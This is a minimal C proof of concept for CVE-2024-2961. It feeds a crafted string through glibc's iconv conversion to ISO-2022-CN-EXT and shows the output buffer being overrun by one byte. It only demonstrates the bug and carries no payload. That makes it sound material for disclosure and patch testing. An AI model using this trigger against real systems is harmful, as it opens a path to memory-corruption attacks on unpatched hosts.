/*
CVE-2024-2961 POC
$ gcc -o poc ./poc.c && ./poc
Remaining bytes (should be > 0): -1
$
*/
#include <iconv.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>

void hexdump(void *ptr, int buflen)
{
    unsigned char *buf = (unsigned char *)ptr;
    int i, j;
    for (i = 0; i < buflen; i += 16)
    {
        printf("%06x: ", i);
        for (j = 0; j < 16; j++)
            if (i + j < buflen)
                printf("%02x ", buf[i + j]);
            else
                printf("   ");
        printf(" ");
        for (j = 0; j < 16; j++)
            if (i + j < buflen)
                printf("%c", isprint(buf[i + j]) ? buf[i + j] : '.');
        printf("\n");
    }
}

void main()
{
    iconv_t cd = iconv_open("ISO-2022-CN-EXT", "UTF-8");

    char input[0x10] = "AAAAA劄";
    char output[0x10] = {0};

    char *pinput = input;
    char *poutput = output;

    // Same size for input and output buffer
    size_t sinput = strlen(input);
    size_t soutput = sinput;

    iconv(cd, &pinput, &sinput, &poutput, &soutput);

    printf("Remaining bytes (should be > 0): %zd\n", soutput);

    hexdump(output, 0x10);
}